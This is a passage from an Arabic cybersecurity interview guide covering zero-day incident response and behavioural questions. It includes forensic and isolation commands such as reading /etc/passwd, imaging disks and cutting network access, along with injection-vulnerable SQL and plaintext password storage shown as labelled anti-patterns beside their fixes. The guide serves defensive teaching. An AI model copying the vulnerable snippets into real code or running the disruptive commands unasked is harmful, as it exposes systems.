✓ ما مدى خطورتها؟ (Critical, High, Medium, Low)
✓ هل تم استغلالها بالفعل؟
✓ ما هي الأنظمة المتأثرة؟
✓ ما هي البيانات المعرضة للخطر؟
```

**2. تشكيل فريق الاستجابة:**
```
- Security Team Lead
- System Administrators
- Developers
- Network Engineers
- Legal/Compliance (إذا لزم)
- Public Relations (للتواصل)
```

**3. عزل الأنظمة المتأثرة:**
```bash
# عزل الخادم المصاب من الشبكة
iptables -I INPUT 1 -j DROP
iptables -I OUTPUT 1 -j DROP

# أو إيقاف واجهة الشبكة
ifconfig eth0 down

# في السحابة (AWS):
aws ec2 modify-instance-attribute \
    --instance-id i-1234567890abcdef0 \
    --groups sg-isolated-quarantine
```

**المرحلة 2: التحليل والتحقيق (Analysis & Investigation)**

**4. جمع الأدلة:**
```bash
# أخذ snapshot من الذاكرة
memdump /dev/mem > memory.dump

# أخذ صورة من القرص
dd if=/dev/sda of=/mnt/external/disk-image.dd bs=4M

# جمع logs
tar -czf logs-$(date +%Y%m%d).tar.gz /var/log/

# حفظ network traffic
tcpdump -i eth0 -w capture.pcap
```

**5. تحليل الثغرة:**
```
✓ كيف تعمل الثغرة؟
✓ ما هو attack vector؟
✓ هل هناك Proof of Concept عام؟
✓ هل يوجد exploits منتشرة؟
✓ من اكتشف الثغرة؟
```

**6. التحقق من الاختراق:**
```bash
# فحص Processes المشبوهة
ps aux | grep -v "^USER" | sort -nrk 3,3 | head -n 10

# فحص Network Connections
netstat -antp | grep ESTABLISHED

# فحص الملفات المعدلة حديثاً
find / -mtime -1 -ls

# فحص Cron Jobs
crontab -l
cat /etc/cron*

# فحص الحسابات الجديدة
cat /etc/passwd | tail -10
```

**المرحلة 3: التخفيف المؤقت (Temporary Mitigation)**

**7. تطبيق Workaround:**
```java
// مثال: إذا كانت الثغرة في endpoint معين
@Component
public class ZeroDayMitigationFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                   HttpServletResponse response,
                                   FilterChain chain) {
        // حجب الوصول للـ endpoint المصاب مؤقتاً
        if (request.getRequestURI().startsWith("/vulnerable-endpoint")) {
            response.setStatus(503);
            response.getWriter().write("Service temporarily unavailable");
            return;
        }

        chain.doFilter(request, response);
    }
}
```

**8. تطبيق قواعد WAF:**
```
# Cloudflare WAF Rule
(http.request.uri.path contains "/vulnerable-path" and
 http.request.method eq "POST" and
 not ip.src in {TRUSTED_IPS})
then block
```

**9. تحديث Firewall Rules:**
```bash
# حجب الوصول الخارجي للخدمة المصابة
iptables -A INPUT -p tcp --dport 8080 ! -s 10.0.0.0/8 -j DROP

# السماح فقط لـ IPs موثوقة
iptables -A INPUT -p tcp --dport 8080 -s TRUSTED_IP -j ACCEPT
iptables -A INPUT -p tcp --dport 8080 -j DROP
```

**المرحلة 4: الإصلاح الدائم (Permanent Fix)**

**10. تطوير Patch:**
```java
// مثال: إصلاح ثغرة SQL Injection
// قبل (vulnerable):
String query = "SELECT * FROM users WHERE id = " + userId;

// بعد (fixed):
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setLong(1, userId);
```

**11. الاختبار الشامل:**
```bash
# Unit Tests
mvn test

# Integration Tests
mvn verify

# Security Tests
./run-security-scan.sh

# Penetration Testing
python3 exploit-test.py --verify-fix
```

**12. Deployment:**
```bash
# Blue-Green Deployment
# 1. Deploy to Green environment
kubectl apply -f deployment-green.yaml

# 2. Test
curl https://green.example.com/health

# 3. Switch traffic
kubectl patch service app-service -p '{"spec":{"selector":{"version":"green"}}}'

# 4. Monitor
kubectl logs -f deployment/app-green

# 5. Rollback if needed
kubectl patch service app-service -p '{"spec":{"selector":{"version":"blue"}}}'
```

**المرحلة 5: التواصل (Communication)**

**13. الإبلاغ الداخلي:**
```
To: Engineering Team, Management
Subject: [URGENT] Zero-Day Vulnerability - Status Update

Summary:
- Vulnerability discovered in [component]
- Severity: [Critical/High/Medium/Low]
- Systems affected: [list]
- Current status: [Contained/Under Investigation/Fixed]
- Timeline: [ETA for fix]

Actions taken:
1. Isolated affected systems
2. Implemented temporary mitigation
3. Patch under development

Next steps:
1. Deploy patch by [date/time]
2. Full security audit
3. Post-mortem meeting scheduled
```

**14. إخطار العملاء (إذا لزم):**
```
متى يجب الإخطار:
✓ إذا تم اختراق بيانات العملاء
✓ إذا كانت الخدمة متوقفة
✓ متطلبات قانونية (GDPR, etc.)

ما يجب تضمينه:
- ما حدث (بدون تفاصيل تقنية كثيرة)
- ما البيانات المتأثرة
- ما الخطوات المتخذة
- ما يجب على العملاء فعله
- معلومات الاتصال للدعم
```

**15. الإبلاغ للجهات المختصة:**
```
✓ CERT (Computer Emergency Response Team)
✓ Vendor المسؤول (إذا كانت الثغرة في مكتبة خارجية)
✓ CVE Program (للحصول على CVE ID)
```

**المرحلة 6: ما بعد الحادث (Post-Incident)**

**16. Post-Mortem Analysis:**
```markdown
# Zero-Day Incident Post-Mortem

## Timeline
- 10:00 AM: Vulnerability discovered
- 10:15 AM: Incident response team assembled
- 10:30 AM: Affected systems isolated
- 11:00 AM: Temporary mitigation deployed
- 2:00 PM: Patch developed and tested
- 4:00 PM: Patch deployed to production
- 4:30 PM: All systems verified secure

## Root Cause
[Detailed technical analysis]

## Impact
- Systems affected: [list]
- Data compromised: [Yes/No - details]
- Downtime: [duration]
- Users affected: [number]

## What Went Well
- Quick detection
- Effective isolation
- Good team coordination

## What Could Be Improved
- Earlier detection would have been possible with better monitoring
- Need more automated response procedures

## Action Items
1. [ ] Implement additional monitoring [Owner: John, Due: 2025-02-01]
2. [ ] Update incident response playbook [Owner: Sarah, Due: 2025-01-25]
3. [ ] Conduct security training [Owner: Team Lead, Due: 2025-02-15]
```

**17. تحسين الأمان:**
```
Short-term:
✓ زيادة monitoring & logging
✓ تحديث WAF rules
✓ مراجعة جميع الأنظمة المشابهة

Long-term:
✓ تطبيق DevSecOps practices
✓ Automated security scanning in CI/CD
✓ Regular penetration testing
✓ Bug bounty program
✓ Security training للمطورين
```

**18. التوثيق:**
```
✓ توثيق الثغرة في knowledge base
✓ تحديث security policies
✓ إنشاء playbook للحوادث المستقبلية
✓ مشاركة الدروس المستفادة مع الفريق
```

---

## أسئلة سلوكية

### س28: أخبرني عن موقف واجهت فيه حادثة أمنية. كيف تعاملت معها؟

**الإجابة:**
يجب أن تتبع هيكل STAR (Situation, Task, Action, Result):

**Situation (الموقف):**
"في إحدى المشاريع، كنت أعمل على تطبيق ويب يحتوي على بيانات حساسة للعملاء. في يوم من الأيام، لاحظنا نشاطاً غير طبيعي في الـ logs - عدد كبير جداً من طلبات login فاشلة من نفس عنوان IP، يستهدف حسابات مستخدمين مختلفة."

**Task (المهمة):**
"كان علي أن أحدد ما إذا كان هذا هجوماً حقيقياً، وأن أوقفه فوراً لحماية بيانات العملاء، مع التأكد من عدم تأثير ذلك على المستخدمين الشرعيين."

**Action (الإجراءات):**
"قمت بالخطوات التالية:

1. **التحليل الفوري:** فحصت الـ logs بعمق ووجدت أن الهجوم كان brute force attack مستهدفاً 150 حساباً مختلفاً في 10 دقائق.

2. **الاحتواء:** حجبت عنوان IP المهاجم مؤقتاً عبر firewall:
```bash
iptables -A INPUT -s ATTACKER_IP -j DROP
```

3. **التحقق من الأضرار:** راجعت جميع محاولات login الناجحة من نفس IP - لحسن الحظ، لم ينجح أي منها.

4. **الحل الدائم:** طبقت rate limiting على endpoint الـ login:
```java
@Configuration
public class RateLimitConfig {
    @Bean
    public Bucket createLoginBucket() {
        return Bucket.builder()
            .addLimit(Bandwidth.classic(5, Refill.intervally(5, Duration.ofMinutes(1))))
            .build();
    }
}
```

5. **التحسينات:** أضفت:
   - Account lockout بعد 5 محاولات فاشلة
   - Email notifications للمستخدمين عند محاولات login فاشلة
   - Monitoring متقدم مع alerts في real-time
   - CAPTCHA بعد 3 محاولات فاشلة

6. **التوثيق:** كتبت incident report وشاركته مع الفريق، وأنشأت playbook لمواجهة هجمات مشابهة مستقبلاً."

**Result (النتيجة):**
"نجحت في إيقاف الهجوم خلال 15 دقيقة من اكتشافه، ولم يتم اختراق أي حساب. الحلول التي طبقتها قللت محاولات brute force بنسبة 95٪ في الأشهر التالية. كما أن الـ playbook الذي أنشأته ساعد الفريق في التعامل بسرعة مع حادثتين مشابهتين لاحقاً."

---

### س29: كيف تبقى على اطلاع بأحدث التهديدات والثغرات الأمنية؟

**الإجابة:**

**1. النشرات والمواقع الأمنية:**
```
- OWASP Top 10
- CVE (Common Vulnerabilities and Exposures)
- NVD (National Vulnerability Database)
- SANS Internet Storm Center
- Krebs on Security
- The Hacker News
- BleepingComputer
```

**2. المتابعة على Twitter/X:**
```
- @OWASP
- @CVEnew
- @threatpost
- @briankrebs
- Security researchers & experts
```

**3. Mailing Lists:**
```
- Full Disclosure
- Bugtraq
- US-CERT
- Vendor security bulletins (Microsoft, Oracle, etc.)
```

**4. Podcasts & YouTube Channels:**
```
- Darknet Diaries
- Security Now
- CyberWire Daily
- IppSec (Penetration testing)
- LiveOverflow
```

**5. الممارسة العملية:**
```
- Hack The Box
- TryHackMe
- OWASP WebGoat
- PentesterLab
- CTF competitions
```

**6. الشهادات والتعليم المستمر:**
```
- CEH (Certified Ethical Hacker)
- CISSP
- OSCP
- CompTIA Security+
- Online courses (Udemy, Coursera, Pluralsight)
```

**7. المؤتمرات:**
```
- Black Hat
- DEF CON
- RSA Conference
- BSides
- OWASP conferences
```

**8. القراءة:**
```
- Security blogs
- White papers
- Research papers
- Security books
```

**9. المجتمعات:**
```
- Reddit (r/netsec, r/cybersecurity)
- Stack Overflow
- OWASP local chapters
- Security Discord servers
```

**10. الممارسة في العمل:**
```
- Security code reviews
- Penetration testing
- Vulnerability assessments
- Incident response drills
```

---

### س30: ماذا تفعل إذا اكتشفت أن زميلك في العمل يقوم بشيء غير آمن؟

**الإجابة:**

**النهج المهني:**

**1. التأكد أولاً:**
```
قبل اتخاذ أي إجراء:
✓ تأكد من أنه فعلاً غير آمن
✓ افهم السياق الكامل
✓ تحقق من السياسات الموجودة
```

**2. التواصل المباشر:**
```
إذا كان الأمر غير عاجل:
✓ تحدث مع الزميل بلطف وخصوصية
✓ اشرح المخاطر الأمنية
✓ اقترح الحل الصحيح
✓ شارك مصادر تعليمية

مثال:
"لاحظت أنك تخزن API keys في Git.
هذا قد يعرض النظام للخطر إذا تم الوصول للمستودع.
ما رأيك أن نستخدم environment variables أو secrets manager بدلاً من ذلك؟"
```

**3. التصعيد إذا لزم:**
```
إذا كان الأمر خطيراً أو رفض الزميل الاستماع:
✓ أبلغ المدير المباشر
✓ أو Security Team Lead
✓ وثّق المشكلة بوضوح
```

**4. اقتراح حلول:**
```
✓ Code review process
✓ Automated security scanning
✓ Security training للفريق
✓ Security guidelines documentation
```

**أمثلة على مواقف شائعة:**

**السيناريو 1: تخزين كلمات المرور في نص واضح**
```java
// ✗ ما لاحظته
user.setPassword(plainPassword);

// التواصل:
"رأيت أننا نخزن كلمات المرور بدون تشفير.
هذا ينتهك security best practices ويعرضنا لمخاطر كبيرة.
دعني أساعدك في تطبيق bcrypt."

// ✓ الحل المقترح
String hashedPassword = BCrypt.hashpw(plainPassword, BCrypt.gensalt(12));
user.setPassword(hashedPassword);
```

**السيناريو 2: SQL Injection**
```java
// ✗ ما لاحظته
String query = "SELECT * FROM users WHERE id = " + userId;

// التواصل:
"هذا الكود عرضة لـ SQL Injection.
دعنا نستخدم PreparedStatement لحماية التطبيق."

// ✓ الحل
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setLong(1, userId);
```

**الأهم:**
```
✓ كن محترماً ولطيفاً
✓ ركز على المشكلة، ليس على الشخص
✓ قدم حلولاً، لا تكتفي بالانتقاد
✓ استخدمها كفرصة تعليمية
✓ ساعد في بناء ثقافة أمنية في الفريق
```

---

تم إعداد هذا الملف ليغطي أهم أسئلة مقابلات الأمن السيبراني. للمزيد من المعلومات، يرجى الرجوع إلى الملف الرئيسي (README.md).
